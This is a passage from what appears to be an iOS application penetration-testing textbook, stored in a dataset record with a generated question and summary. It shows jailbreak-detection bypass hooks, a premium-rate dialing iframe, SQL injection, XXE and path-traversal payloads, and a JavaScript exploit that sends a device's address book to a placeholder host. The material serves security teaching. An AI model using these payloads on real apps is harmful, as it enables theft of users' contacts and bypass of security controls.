isJailbroken\");\nreturn NO;\n}\nstatic void __attribute__((constructor)) initialize(void)\n{\nNLog(@\"Installing hook\");\nclass_replaceMethod(objc_getClass(\"SecurityController\"), \\\n@selector(isJailBroken), (IMP) new_isJailBroken, (IMP*)old_isJailBroken);\n}\nThis example is similar to the Substrate example earlier, except that it does not use the Substrate APIs. The\nlibrary injects a new constructor into the application and uses the class_replaceMethod() function to swizzle\nthe implementation of the isJailbroken selector.\nTo compile the example as a dynamic library using clang, you use the following command:\nclang -arch armv7 -isysroot\n/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Deve\nloper/SDKs/iPhoneOS8.0.sdk -dynamiclib -framework Foundation -lobjc\nisjailbroken.m -o isjailbroken.dylib\nAfter your library is compiled, upload it to the device via scp and place it in the /usr/lib directory. To force an\napplication to respect the DYLD_INSERT_LIBRARIES environment variable you can use launchctl:\nlaunchctl setenv DYLD_INSERT_LIBRARIES \"/usr/lib/isjailbroken.dylib\"\nThe application can now be launched as normal through the user interface and the SecurityController\nisJailBroken method will always return NO, because the function implementation has been replaced with one\nthat simply returns NO in all cases.\nInspecting iOS Applications using Snoop-it\nTools are an essential part of any security professional’s arsenal and anything that introduces automation of\notherwise cumbersome tasks should always be welcomed. Perhaps one of the most complete toolkits for\npenetration testing iOS applications is Snoop-it, which under the hood uses Substrate to instrument an\napplication. Snoop-it (https://code.google.com/p/snoop-it/) is best described by the tool’s author Andreas\nKurtz:\n“Snoop-it is a tool to assist dynamic analysis and blackbox security assessments of mobile apps by retrofitting\nexisting apps with debugging and runtime tracing capabilities. Snoop-it allows on-the-fly manipulations of\narbitrary iOS apps with an easy-to-use graphical user interface. Thus, bypassing client-side restrictions or\nunlocking additional features and premium content of Apps is going to be child’s play.”\nSnoop-it contains several features you can use during an iOS application security assessment, including but not\nlimited to the following useful activities:\nMonitoring filesystem, network, keychain, and sensitive API access\nDetecting basic jailbreak bypasses\nInspecting the Objective-C runtime state, including loaded classes and available methods\nMonitoring of the console log\nTracing methods\nTo install Snoop-it simply install the de.nesolabs.snoopit package from the http://repo.nesolabs.de/ Cydia\nrepository. After the Snoop-it package is installed you can launch the Snoop-it application that should now be\nvisible on your device’s user interface. Figure 3.21 shows the application configuration view where you are able\nto select the applications that you want to be inspected.\nSelecting an application and then subsequently opening the target application causes Snoop-it to load a\nwebserver within the runtime of your target application. You can reach the Snoop-it web server by browsing to\nthe external interface of your device on TCP port 12345, using username and password credentials of snoop-it\nand snoop-it. After you’re logged in to the Snoop-it web server, a view similar to the one shown in Figure 3.22\nappears.\nThe view displayed in Figure 3.22 demonstrates the Objective-C classes view in Snoop-it; this view shows the\nclasses that exist in the application, with those that currently have an instance shown in green.\nTo see how Snoop-it can be used for discovering vulnerabilities, consider a simple application that encrypts and\ndecrypts some data. One of the features of Snoop-it is the method-tracing tool; you can get to this feature by\nselecting Method Tracing from the Runtime Manipulation folder. Tick the Tracing on/off box to enable or\ndisable the method-tracing feature, which causes all methods invoked by the application to be logged.\nFor example, simply ticking this box and then using the application so that crypto routines are called causes the\nlog to be populated with the history of the application’s internal behavior. Here is a sample output from the\nmethod-tracing tool:\nMon Oct 27 18:25:39 2014 (Thread 0): - [Cipher(0x4371b30) initWithKey:],\nargs: <__NSCFConstantString 0x101e4: abcdef123456>\nMon Oct 27 18:25:39 2014 (Thread 0): - [Cipher(0x4371b30) setCipherKey:],\nargs: <__NSCFConstantString 0x101e4: abcdef123456>\nMon Oct 27 18:25:39 2014 (Thread 0): - [Cipher(0x4371b30) encrypt:], args:\n<0x500400>\nMon Oct 27 18:25:39 2014 (Thread 0): - [Cipher(0x4371b30)\ntransform:data:], args: 0, <0x500400>\nMon Oct 27 18:25:39 2014 (Thread 0): + [Cipher(0x10e50) md5:], args:\n<__NSCFConstantString 0x101e4: abcdef123456>\nMon Oct 27 18:25:39 2014 (Thread 0): - [Cipher(0x4371b30) decrypt:], args:\n<0x43713b0>\nMon Oct 27 18:25:39 2014 (Thread 0): - [Cipher(0x4371b30)\ntransform:data:], args: 1, <0x43713b0>\nMon Oct 27 18:25:39 2014 (Thread 0): + [Cipher(0x10e50) md5:], args:\n<__NSCFConstantString 0x101e4: abcdef123456>\nMon Oct 27 18:25:39 2014 (Thread 0): - [ViewController(0x513790)\nperformSelector:withObject:withObject:], args:\n@selector(_controlTouchEnded:withEvent:), <0x561180>, <0x6775b0>\nMon Oct 27 18:25:39 2014 (Thread 0): - [ViewController(0x513790)\nisViewLoaded]\nMon Oct 27 18:25:39 2014 (Thread 0): - [ViewController(0x513790)\nloadViewIfRequired]\nMon Oct 27 18:25:39 2014 (Thread 0): - [AppDelegate(0x679e50)\nperformSelector:withObject:withObject:], args:\n@selector(_controlTouchEnded:withEvent:), <0x561180>, <0x6775b0>\nBy analyzing the output of the method-tracing tool you can see that the application creates and initializes a new\nCipher object. The application then goes on to use this object to encrypt and decrypt a block of data using a hard-\ncoded encryption key of “abcdef123456.” You should well understand the dangers of using a hard-coded\nencryption key, and this simple example serves to demonstrate how you can use Snoop-it to automate many of\nthe tasks necessary to identify security vulnerabilities.\nUnderstanding Interprocess Communication\nAs you learned in Chapter 2, iOS applications run inside an isolated sandbox that prevents applications from\ncommunicating with each other and as such interprocess communication (IPC) is generally forbidden. Some\nexceptions to this rule include the following:\nThe OS pasteboard\nRegistered protocol handlers\nApplication extensions\nIt stands to reason that you should scrutinize any IPC endpoint in an application during a security review,\nbecause IPC endpoints provide an entry point for potentially tainted data to enter an application and be\nprocessed by it. In the following sections you will learn how to identify and attack IPC endpoints in an iOS\napplication, specifically focusing on protocol handlers and application extensions.\nAttacking Protocol Handlers\nOn iOS, protocol handlers have been used as a rudimentary form of IPC for a number of years. An application is\nable to register its own custom URL scheme, which causes the application to be invoked any time the URL\nscheme is called. When a URL is opened, the full path and parameters are passed to the application’s handler;\nthis allows data to be sent in a single direction. For example, imagine you wanted to get a user of your website to\nyour mobile application’s page in the App Store while he is browsing your website in MobileSafari. To do this\nyou could use the itms-apps URL scheme, which is registered by the App Store application on your device. The\nURL to load your application’s page may look similar to the following:\nitms-apps://itunes.apple.com/app/id<num>\nwhere <num> would be replaced with the identifier of your application in the App Store.\nTo register your own custom URL scheme in an application, the application should have the URL scheme set in\nits Info.plist file, which you can configure in Xcode in the Info URL Types Setting, as shown in Figure 3.23.\nThe application should also implement the application:openURL delegate method, which is where the code\nresponsible for handling the URL invocation will live. Be sure to closely inspect any code executed in this\ndelegate method as part of any application assessment, because it represents an interesting entry point to the\napp.\nFigure 3.23 Registering a URL scheme in Xcode\nA sample implementation may look similar to the following:\n(BOOL)application:(UIApplication *)application openURL: \\\n(NSURL *)url sourceApplication:(NSString *)sourceApplication \\\nannotation:(id)annotation\n{\nif([[url scheme] isEqual:@\"myvoip\"])\n{\nif (!([[url absoluteString] rangeOfString:@\"/dialer/\"].location \\\n== NSNotFound))\n{\nNSDictionary *param = [self getParameters:url];\nif([param objectForKey:@\"call\"]!= nil)\n{\n[Dialer makeCall:param];\n}\nreturn YES;\n}\n}\nreturn NO;\n}\nIn this example, the application has registered the myvoip:// URL scheme and expects it to be invoked with a\nhost of dialer and URL parameter named call. Invoking this URL scheme causes the application to open, and\nthen a call will be made to the user-supplied phone number. Such a valid URL could look as follows:\nmyvoip://dialer/?call=123\nAny vulnerabilities that may exist in a URL handling scheme depend entirely on the functionality of the\napplication, how it handles the data read from the URL, and what it does with that input. In this simple\nexample, the VoIP application could be abused by an attacker to make a call to premium rate number because\nthe application does not prompt the user before the call is made, nor does it verify the source application that\nthe request originated from. The URL scheme could therefore be invoked by an iframe in a web page that the\nuser browsed to in MobileSafari; that is:\n<iframe src=\"myvoip://dialer/?call=0044906123123 \"></iframe>\nIn a compiled application review, you can find the URL schemes registered by the application in the Info.plist\nfile under the CFBundleURLTypes key. However, to identify the full URL paths supported by a compiled\napplication you’ll most likely need to do some reverse engineering; the UIApplication openURL delegate method\nshould be your first point of call. You can gain some insight into the structure of URL that the URL handler\nexpects by simply extracting the strings from a binary, although this is unlikely to identify URLs that are\ndynamically populated.\nFor example, the Info.plist file for the Facebook application contains the following:\nCFBundleURLTypes = (\n{\nCFBundleTypeRole = Editor;\nCFBundleURLName = \"com.facebook\";\nCFBundleURLSchemes = (\nfbauth2,\nfbauth,\nfb,\nfblogin,\nfbapi,\nfbapi20130214,\nfbapi20130410,\nfbapi20130702,\nfbapi20131010,\nfbapi20131219,\nfbapi20140116,\nfbapi20140410\n);\n}\n);\nIf you run strings on the Facebook application binary and grep for the URL scheme you will find some of the\nfollowing URLs:\n$ strings Facebook.decrypted | grep \"fb://\"\nfb://profile\nfb://profile?id=%@\nfb://profile?%@=%@\nfb://profile?id=%@&%@=%@\nfb://profile?id=%@&%@=%@&%@=%@\nfb://timelineappsection?id=%@\nfb://album?id=%@\nfb://group?id=%@\nfb://photo?%@\nfb://group?id=%@&object_id=%@&view=permalink\nfb://groupPhotos?id=%@\nfb://%@?%@\nfb://story?%@\nfb://page_about?id=%@\nfb://page_reviews?id=%@\nfb://page_friend_likes_and_visits?id=%@&should_show_visits_first=%d\nfb://page_post_insights?page_id=%@&story_id=%@\nfb://page?id=%@\nfb://page?id=%@&source=notification&notif_type=%@\nfb://page?id=%@&source=%@&source_id=%@\nfb://page?id=%@&showreactionoverlay=%d\nINSECURE URL HANDLING IN SKYPE\nIn 2010 Nitesh Dhanjani (http://www.dhanjani.com/blog/2010/11/ insecure-handling-of-url-schemes-\nin-apples-ios.html) documented a vulnerability in the Skype iOS application. The Skype application\nregistered the skype:// protocol handler, which when invoked could be used to trigger a call without\nprompting for the user’s permission. This behavior was being abused in the wild by malicious websites for\nmonetary gain, forcing the Skype application to make calls to premium rate numbers that were owned by\nthe attacker.\nApplication Extensions\nApplication extensions are a new feature introduced in iOS 8 to allow developers to extend custom functionality\nand content beyond their application to other applications on the device using an IPC channel. Several extension\ntypes are pre-defined by Apple, including the following:\nToday—Widgets that extend the Today view of the notification center\nShare—Share content with other applications or websites\nAction—Manipulate or access content in a host application\nPhoto Edit—Apply custom editing to a photo in the Photos app\nDocument Provider—Share documents with other applications\nCustom Keyboard—Replace the default iOS keyboard with a custom keyboard\nAn important concept to understand about extensions is that they are not applications, although the extension\ndoes need a host app to exist and run. Extensions exist to allow host applications to call into pieces of\nfunctionality provided by the containing app (the extension provider). Although the term host application can\nbe somewhat confusing, it is worth noting that this refers to the application that hosts the code that calls in to\nthe extension provider via the extension. To do this, the host application has a bidirectional communication\nchannel with the extension, which in turn has limited interaction with the containing app (as opposed to a direct\ncommunication channel). The containing app and the host app do not communicate with each other on any\nlevel. It is, however, possible for the extension and the containing app to share resources. For example, they may\nhave a shared document container, which would typically be implemented using the App Groups capability.\nFigure 3.24 illustrates the communication channel architecture between a host app, an app extension, and a\ncontaining app. In this instance limited communication between the extension and the containing app is\npossible using a URL handler.\nFigure 3.24 An app extension can indirectly communicate and share resources with the containing app.\nExtensions have been designed in this way to provide a degree of separation between the host app and the\ncontaining app; as such, the extension runs in a completely separate execution context to the containing app.\nIndeed, extensions run in a unique execution context, meaning that multiple copies of an extension can be\nlaunched from separate host apps.\nThe attack surface for an application extension is highly dependent on the functionality that is exposed to the\nhost app (the one that calls the extension). A malicious host app could, for example, bundle an extension that\nexploits a weakness in the extension point. For example, consider a fictitious application and assume that the\ndeveloper wants to share some data from a database stored in a shared resource so that it can be accessed by\nboth the containing app and the extension. The extension may expose some functionality that exists in the host\napp where tainted input from the container app enters the extension and ultimately gets populated into a\ndynamic SQL query. The consequences here are obvious; a SQL injection vulnerability in the host app’s\nextension exposes the database to read and write attacks in a way that the extension hadn’t intended. Another\ngood illustration of this is a malicious keyboard extension used across all applications on the device and could\nbe used to create a simple keylogger.\nTo illustrate how extensions work, we offer this simple example using the 1Password\n(https://agilebits.com/onepassword) extension. 1Password is a password manager application that can be used\nto generate and store credentials for websites or other resources. 1Password offers an extension\n(https://github.com/AgileBits/onepassword-app-extension) that other host applications can use to query\ncredentials that are stored in 1Password. For example, Twitterific (http://twitterrific.com/ios) acts as a host\napp and includes code to interact with the 1Password extension to retrieve Twitter credentials that are stored in\n1Password. To query the 1Password extension, you can use code similar to the following:\n[[OnePasswordExtension sharedExtension]\nfindLoginForURLString:@\"twitter.com\" forViewController:self sender:sender\ncompletion:^(NSDictionary *loginDict, NSError *error)\nIn the previous code the host app requests credentials for the twitter.com domain; however, a malicious app\ncould potentially request credentials for any domain. In the case of 1Password, note that the user has to\nmanually approve the use of the credential, which constitutes a mitigating factor for this issue, but it is not\ninconceivable to think that a user could unknowingly approve such a request.\nThe different attack vectors for an application are highly dependent on the functionality that is exposed by the\nextension, but any extensions exposed by an app are certainly areas that should be subjected to plenty of\nscrutiny during any iOS app security assessment, especially given that extensions on iOS are a new technology\nand is relatively unexplored by security researchers to date. Many developers may also be relatively uneducated\nabout security risks that are possible to introduce using extension interfaces.\nAttacking Using Injection\niOS applications can handle input from a wide range of different entry points, including but not limited to:\nWeb applications\nURL schemes\nFile types (for example, documents, images, vcards)\nAirDrop\niBeacons\nBluetooth\nWi-Fi\nPasteboards\nApplication extensions\nIt’s therefore unsurprising that many mobile applications are affected by many classic injection-style attacks,\nmany of which you are likely to be familiar with in coming from a web application security background. In a\nnutshell, injection vulnerabilities can arise in any area that an application accepts user input from; that is, from\nuntrusted entry points. Therefore, closely scrutinizing application entry points as part of any iOS application\nsecurity assessment is essential. This section describes some of the common injection-type attacks that can\noccur in iOS applications.\nInjecting into UIWebViews\nUIWebView is the iOS-rendering engine for displaying web content, but also many other document types; it\nsupports a number of different file formats, including:\nHTML\nPDF\nRTF\nOffice Documents (doc, xls, ppt)\niWork Documents (Pages, Numbers, and Keynote)\nUIWebView is built upon WebKit (https://www.webkit.org/) and uses the same core frameworks as Safari and\nMobileSafari. Consequently, a web view is also a web browser and can be used to fetch and display remote\ncontent. As would be expected of a web browser, web views also support JavaScript, allowing applications to\nperform dynamic, client-side scripting.\nThere is no way to disable JavaScript in the UIWebView API, so all iOS web views support JavaScript by default.\nIt’s therefore unsurprising that as with traditional web applications, iOS applications can be affected by cross-\nsite scripting (XSS) and script injection attacks. If you are not familiar with cross-site scripting refer to the\nrelevant OWASP wiki page for a more in-depth explanation of cross-site scripting attacks\n(https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)).\nCross-site scripting can occur in an iOS application in any scenario where user-supplied input is blindly\npopulated into a UIWebView without sufficient sanitization. Typically, two factors escalate a cross-site scripting\nvulnerability from being moderately serious to a critical vulnerability:\nThe origin in which the web view is loaded\nAny native functionality exposed to JavaScript by virtue of a JavaScript to Objective-C bridge\nThe latter of these factors is dealt with in detail in Chapter 18, but for the moment it is important to understand\nthat any time an application exposes native functionality to JavaScript, the potential exists for cross-site\nscripting exploitation.\nThe same origin policy is an important concept in web security, because it restricts how documents and scripts\nloaded from one origin can interact with a resource from another origin; the following resource provides a good\ngeneral description of the same origin policy: https://developer.mozilla.org/en-US/docs/Web/Security/Same-\norigin_policy. At the heart of this concept is the definition of the origin, which is governed by the protocol,\nhost, and port that a resource is loaded from. This is relevant to iOS applications because any resource that is\nloaded from the local filesystem will be permitted to access other resources on the filesystem via JavaScript,\nincluding files local to the application’s sandbox, and also other files such as the address book database. To\nillustrate this consider the following simple example:\n[_mainwebview loadRequest:[NSURLRequest requestWithURL:[NSURL\nfileURLWithPath:[[NSBundle mainBundle] pathForResource:@\"main\"\nofType:@\"html\"]isDirectory:NO]]];\nThis code loads the main.html file, which is stored in the application’s bundle directory, into a web view.\nAlthough this may seem relatively innocuous, the HTML file is actually loaded with the origin as the local\nfilesystem, meaning that any JavaScript in this HTML file will have access to the same files as the application\nitself. There are typically two ways in which script injection can occur when loading local files:\nWhen content read from another source, such as a web application, is later executed by a JavaScript eval()\ncall\nWhen content is read from via some Objective-C logic and is then executed in the document object model\n(DOM) of the application using the UIWebView stringByEvaluatingJavaScriptFromString delegate method.\nAssuming a cross-site scripting vulnerability occurs by one of these vectors, exploiting the web view to steal\ncontent from the device may be possible. A sample exploit payload to perform such an attack to download the\ndevice’s address book database is described next.\nThe following JavaScript exploit payload reads the contents of the AddressBook .sqlitedb file, base64, encodes\nit (code omitted for brevity), and then sends it as a POST request to the http://x.x.x.x/readaddressbook.py\nscript:\nfunction reqListener () {\nvar http = new XMLHttpRequest();\nvar url = \"http://x.x.x.x/readaddressbook.py\";\nb = base64ArrayBuffer(this.response)\nvar params = \"ab64=\" + b;\nhttp.open(\"POST\", url, true);\nhttp.setRequestHeader(\"Content-type\",\"plain/text\");\nhttp.setRequestHeader(\"Content-length\", params.length);\nhttp.setRequestHeader(\"Connection\", \"close\");\nhttp.onreadystatechange = function() {\nif(http.readyState == 4 && http.status == 200) {\nalert('Addressbook sent');\n}\n}\nhttp.send(params);\n}\nvar file = \"file:///var/mobile/Library/AddressBook/AddressBook.sqlitedb\";\nvar oReq = new XMLHttpRequest();\noReq.responseType = 'arraybuffer';\noReq.onload = reqListener;\noReq.open(\"get\", file, true);\noReq.setRequestHeader(\"Connection\", \"close\");\noReq.send();\nThe exploit payload is relatively agnostic and can be used to steal content off the device providing the\napplication is suitably permissioned to access it.\nSKYPE iOS APPLICATION CROSS-SITE SCRIPTING\nThe Skype iOS application was affected by a cross-site scripting vulnerability when displaying a user’s full\nname for an incoming call.\nThe Skype app used a local HTML file as a template for a UIWebView without sanitizing the user’s full\nname. In this instance the attacker could access the local filesystem because the file was being loaded in\nthe local context; a proof of concept exploit for the vulnerability was developed to retrieve and upload the\ndevice’s address book. For further information refer to the following post:\nhttps://www.superevr.com/blog/2011/skype-xss-explained.\nInjecting into Client-Side Data Stores\nMobile applications often need to store data to the device, and while many ways exist to store data on an iOS\ndevice, one of the simplest and most common ways to achieve this is to use a SQLite data store. Much like when\nSQL is used within web applications, if SQL statements are not formed securely, apps can find themselves\nvulnerable to SQL injection. The following resource provides a general introduction to SQL injection:\nhttps://www.owasp.org/index.php/SQL_Injection.\nTo perform data access on client-side SQLite databases, iOS provides the built-in SQLite data library. If using\nSQLite, the application will be linked to the libsqlite3.dylib library.\nSimilarly to traditional web applications, SQL injection in iOS applications occurs when unsanitized user input\nis used to construct a dynamic SQL statement. To compile a SQL statement, the statement must first be defined\nas a constant character array and passed to one of the SQLite prepare methods.\nTo illustrate how SQL injection in a client-side data store can represent a security problem, consider the\nexample of a social networking application reading multiple users’ status messages and then storing them for\noffline viewing in a SQLite database. The application reads from multiple user feeds and renders a link to the\nuser’s profile and her display name in the app. The following code, for this purpose, is a dynamically created\nSQLite statement that is executed each time the user’s message feed is read:\nsqlite3 *database;\nsqlite3_stmt *statement;\nif(sqlite3_open([databasePath UTF8String], &database) == SQLITE_OK)\n{\nNSString *sql = [NSString stringWithFormat:@\"INSERT INTO messages \\\nVALUES('1', '%@','%@','%@')\", msg, user, displayname];\nconst char *insert_stmt = [sql UTF8String];\nsqlite3_prepare_v2(database, insert_stmt, -1, &statement, NULL);\nif (sqlite3_step(statement) == SQLITE_DONE)\nIn the preceding code excerpt, the developer first opens the SQLite database whose name corresponds to the\nstring in the databasePath variable. If the database is successfully opened, an NSString object is initialized to\ncreate a dynamic SQL statement using the unsanitized, attacker-controlled msg, user, and displayname variables.\nThe SQL query is then converted to a constant character array and compiled as a SQL statement using the\nsqlite3_prepare_v2 method. Finally, the SQL statement is executed using the sqlite3_step method.\nBecause the parameters that are used to construct the statement originate from the user, and the statement is\nconstructed by concatenation, the resulting statement can be user controlled. For example, consider a malicious\nuser setting a status message of his or her social network page to the following:\nCheck out my cool site http://mdsecattacker.net', 'Goodguy', 'Good guy');/*\nWhen the victim browses to the attacker’s page, this would result in the following SQL query effectively being\nexecuted:\nINSERT INTO messages VALUES('1', 'Check out my cool site\nhttp://mobileapphacker.com', 'Goodguy', 'Good guy');\n/*','originaluser','Original User');\nIn this example the attacker is able to control the subsequent fields in the query and make the message appear\nas if it originated from another user who may be more reputable or trustworthy to the victim, making the user\nmore inclined to click on the link to the attacker-controlled site. Although this example may seem somewhat\ncontrived, it is actually a common problem for applications that use SQLite as a client-side data store. The\nconsequences of such injections are typically application-dependent, because SQLite does not offer the same\nrich functionality found in server-side databases such as Oracle or MySQL, wherein SQL injection\nvulnerabilities may result in command execution, for example.\nInjecting into XML\nXML is widely used in web and mobile applications to represent data structures, and it is also common to see\nXML being parsed from web application responses and from downloads made by apps. If an attacker is able to\ncontrol XML content being parsed then this can give rise to the well-understood attacks associated with XML\nprocessors. The iOS SDK provides two options for parsing XML; the NSXMLParser and libxml2. However, a\nnumber of popular third-party XML parser implementations are also widely used in iOS apps.\nOne common attack often associated with XML parsers is known as the “billion laughs” attack\n(http://en.wikipedia.org/wiki/Billion_laughs), in which the parser is supplied with a number of nested\nentities, which when expanded, can cause a Denial-of-Service condition. The default parsers included with the\niOS SDK are not vulnerable to this attack; when a nested entity is detected the NSXMLParser will raise an\nNSXMLParserEntityRefLoopError exception, while the LibXML2 parser will throw an error stating “Detected an\nentity reference loop.”\nAnother common attack scenario with XML parsers is the parsing of external XML entities. If you are not\nfamiliar with external entity injection attacks you should familiarize yourself with the topic; OWASP provides a\nuseful description (https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing). Parsing of\nexternal XML entities is not enabled by default in the NSXMLParser class, but was enabled by default in the\nLibXML2 parser up to version 2.9. To enable the parsing of external entities in the NSXMLParser, the developer\nmust explicitly set the setShouldResolveExternalEntities option, which causes the\nfoundExternalEntityDeclarationWithName delegate method to be invoked whenever an entity is encountered\nwithin an XML document being parsed.\nTo illustrate such an attack, consider an application that allows users to skin the application, dynamically\nadjusting the user interface of the application based on a skin configuration. The skin configuration files are\nXML documents, which can be shared between users on the application’s social networking site. A sample\nimplementation for parsing the XML may look as follows:\n- (void)parseXMLStr:(NSString *)xmlStr {\nBOOL success;\nNSData *xmlData = [xmlStr dataUsingEncoding:NSUTF8StringEncoding];\nNSXMLParser *addressParser = [[NSXMLParser alloc] initWithData:xmlData];\n[addressParser setDelegate:self];\n[addressParser setShouldResolveExternalEntities:YES];\nsuccess = [addressParser parse];\n}\n- (void)parser:(NSXMLParser *)parser didStartElement: \\\n(NSString*)elementName namespaceURI:(NSString *)namespaceURI \\\nqualifiedName:(NSString*)qName attributes:(NSDictionary *)attributeDict {}\n- (void)parser:(NSXMLParser *)parser foundCharacters:(NSString *)string {}\n- (void)parser:foundExternalEntityDeclarationWithName:publicID:systemID {}\n- (void)parser:(NSXMLParser *)parser parseErrorOccurred:(NSError *)parseError{\nNSLog(@\"Error %i, Description: %@\", [parseError code],\n[[parser parserError] localizedDescription]);\n}\nIn this example the application has set the setShouldResolveExternal Entities constant to yes, meaning that\nthe application will parse and resolve external entities found within a document, leaving the application\nvulnerable to external entity injection attacks. Exploitation of traditional external entity injection vulnerabilities\ncan result in access to arbitrary files; however, in this case exploitation is generally non-trivial because the files\nthat can be accessed are constrained by the application’s sandbox restrictions. It is, however, possible to force\nthe parser to connect to arbitrary endpoints using a URL handler, which could potentially be leveraged for other\ntypes of attack such as exploitation of web applications running on the user’s local network. A malicious skin\nconfiguration file may look as follows:\n<?xml version=\"1.0\" encoding=\"iso-8859-1\"?>\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM \"http://192.168.1.1/disablefirewall\" >\n]>\n<skin>\n<colour>&xxe;</colour>\n</skin>\nThis simple example would initiate a request from the app to the web server running at http://192.168.1.1.\nInjecting into File-Handling Routines\nAlthough less common, you may at times find that you have an injection vulnerability into a file-handling\nroutine in an iOS application, where you’re able to control all or part of the filename being processed. This type\nof scenario can often lead to vulnerable conditions if appropriate sanitization and canonicalization are not\ncarried out when constructing filenames. Disregarding the standard C file-handling routines, two main classes\nare used for file handling in the iOS SDK: NSFileManager and NSFileHandle.\nThe NSFileManager class offers robust filesystem interaction with a number of instance methods to perform file\noperations whereas the NSFileHandle class provides a more advanced means of interacting with a file descriptor.\nNSFileHandle class provides interfaces that are closer to the traditional C file operations and provides a means to\ndirectly go to offsets within files and leaves the responsibility of closing the handle to the developer. Both of\nthese classes can be affected by directory traversal issues when an attacker can control part of the filename.\nTo illustrate issues that can occur when dealing with filesystem interactions, consider a fictitious social\nnetworking application that retrieves a list of your friends and saves them to profiles on the device so that they\ncan be viewed offline. In this scenario, the server-side web application allows users to upload their profile\nimages, which are later stored by the mobile application in an images directory under the name of the friend; for\nexample Documents/images/joebloggs.png. In addition to displaying images, the application also renders users’\nprofiles by creating a local HTML file for the user, which is stored in the Documents/profile directory under the\nname of the friend and opened in a UIWebView whenever the user views this friend’s profile in the application.\nBecause no sanitization is performed on uploaded filenames by the web app, malicious users are able to upload\na profile picture that is not an image and can instead contain arbitrary content. They are also able to change\ntheir name on the site to any string they choose. When the mobile application downloads the user’s profile\nimage, it uses code similar to the following to store it:\nNSString *filePath = [NSString stringWithFormat:@\"%@/images/%@.png\",\ndocumentsDirectory, friendName];\n[imageFile writeToFile:filePath atomically:YES\nencoding:NSUTF8StringEncoding error:&error];\nIn this example imageFile is an NSString value that has been read from the image, and filePath is created\nbased on NSDocumentDirectory concatenated with the images directory and the friend’s name. A malicious user\ncan change his profile name to traverse out of the images directory and into the profile directory to overwrite\nthe profile of any friend the user has. The attacker also controls the content of the file as it is populated from his\nuser profile. The response from the server-side web service may look as follows:\n{\n\"Friend\": {\n\"Name\": \"../profile/janeblogs.html\",\n\"ContactNumber\": \"<html>\",\n\"About\": \"<body><script>alert(1)</script>\",\n\"Likes\": \"</body>\",\n\"Dislikes\": \"<html>\",\n}\n}\nThe attack payload forces the writeToFile method to traverse to the parent directory into the profile folder\nwhere it overwrites the profile of “Jane Blogs” with some malicious HTML. If you can recall from the cross-site\nscripting attacks discussion from earlier in this chapter, a UIWebView opened with the local filesystem origin has\nthe ability to access files on the filesystem, so attackers could potentially leverage this issue to steal files from\nthe device.\nSummary\nIn this chapter you have learned that the attack surface for an iOS application is quite significant, and a number\nof different ways exist in which to attack an application from both whitebox (informed, with source code) and\nblackbox (without source code) perspectives. The chapter has explained important topics such as transport\nsecurity and data storage, including ways to not only identify such issues but also exploit them.\nA key topic that this chapter focuses on is how an attacker can use static patching and instrumentation to\nmanipulate the behavior of an application to bypass security controls. Binary defenses are expected to become\nmuch more mainstream in mobile applications in the future, and if you perform penetration tests of iOS\napplications you likely will need skills to assess and attempt to defeat these measures.",
    "question": "What are the key methods and techniques for identifying and exploiting vulnerabilities in iOS applications related to transport security, certificate validation, and insecure data storage?",
    "summary": "This chapter discusses various methods for attacking iOS applications, including network vulnerabilities, physical and interactive device access, and insecure data storage. It covers how to identify and exploit transport security issues like cleartext HTTP requests and certificate validation flaws, as well as how to bypass certificate pinning and manipulate the iOS runtime using tools like Cydia Substrate and Frida. It also explains how to exploit insecure storage by checking data protection classes and how to bypass local authentication or access internal networks through application extensions and protocol handlers. Finally, it highlights common injection vulnerabilities, such as cross-site scripting and SQL injection, that can be exploited in iOS apps."
  },
  {
    "start": 23,
    "end": 26,
    "text": "CHAPTER 4\nIdentifying iOS Implementation Insecurities\nArmed with the knowledge from Chapter 3, you are well equipped to understand the mechanisms for testing iOS\napplications. However, in addition to the various attack scenarios, you should consider a number of other things\nwhen developing or assessing an iOS application. Indeed, many weaknesses can arise as a consequence of using\ncertain APIs in the iOS SDK. This chapter documents the avenues in which due to lack of awareness, developers\ncan inadvertently expose their applications to risk through these API side effects. Where applicable, the chapter\nalso details remedial action and ways to secure implementations.\nDisclosing Personally Identifiable Information\nAlthough the issue is not specific to iOS, handling personal data is a serious concern for mobile applications and\none that should be considered during the design phase of an application and stringently investigated as part of\nany assessment. Any data that can be used to uniquely identify users, their habits, locations, actions, or the\ndevice should be treated with particular care. Such information may not strictly be considered personally\nidentifiable information (PII), but it can be used to track the user, which can also be considered an infringement\nof privacy.\nTypically, when you review how a mobile application handles personal data, you should consider the following\nattack vectors:\nHow is personal or privacy-related data logged or stored, not just on the client but also the server?\nHow is personal or privacy-related data protected when communicated across a network?\nIs the personal or privacy-related data that is used by the application relevant and appropriate to its use case?\nIs any personal data exposed to other applications on the device through the use of inter-process\ncommunication (IPC) mechanisms or shared containers?\nThis section details some of the types of personal or privacy-related data that you may encounter when\nreviewing an iOS application.\nHandling Device Identifiers\nEvery iOS device has a 40-character-long hex value, known as the unique device identifier (UDID), that\nuniquely identifies the device. You can find the UDID for your device by clicking on the Serial Number option\nunder the device Summary tab in iTunes.\nPrior to iOS 6, third-party applications could access the UDID using the iOS public APIs. This lead to it not only\nbeing used to track users for marketing and advertising purposes, but also in some cases for nefarious reasons.\nApple responded to this abuse by revoking access to the UDID for third-party applications.\nHowever, legitimate reasons can sometimes exist for an application to identify a user or device, and some users\nmay be happy to receive advertisements. At present there are two methods of identifying a device, and you\nshould consider how they are used or protected when assessing an application:\nAdSupport framework—Introduced in iOS 6 specifically for applications that use advertisements, this\nframework exposes the advertisingIdentifier property (see\nhttps://developer.apple.com/LIBRARY/ios/documentation/AdSupport/Reference/ASIdentifierManager_Ref/index.html#//apple_ref/occ/instp/ASIdentifierManager/advertisingIdentifier\nThis property returns a unique identifier that is static across all applications but can be manually reset by the\nuser via the Settings ➢ Privacy ➢ Advertising ➢ Reset Advertising Identifier setting. The identifier will also\nbe reset automatically if you reset or erase your device. The use of this identifier is also subject to certain\nrestrictions that are dependent upon the value of the Limit Ad Tracking setting that is found in the\nAdvertising settings category of the device. If the flag is enabled, applications should use the identifier only\nfor frequency capping, conversion events, estimating the number of unique users, security and fraud\ndetection, and debugging. However, enforcing this is difficult because if the data is aggregated and processed\non the server side, Apple has no way to concretely ascertain how it is being used, and so misuse of this\nproperty can raise privacy concerns.\nUIDevice class—An alternate method of identifying the device is the identifierForVendor property 